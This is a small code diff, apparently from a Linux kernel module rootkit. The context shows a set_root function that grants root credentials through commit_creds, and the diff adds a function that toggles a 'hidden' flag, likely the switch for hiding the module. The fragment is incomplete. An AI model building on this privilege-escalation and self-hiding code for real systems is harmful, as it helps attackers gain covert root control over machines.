@@ -46,3 +46,12 @@ static void set_root (void){
 	commit_creds(root);
 }
 
+extern int hidden;
+
+static inline void flip_hidden_flag(void)
+{
+    if (hidden)
+        hidden = 0;
+    else
+        hidden = 1;
+}
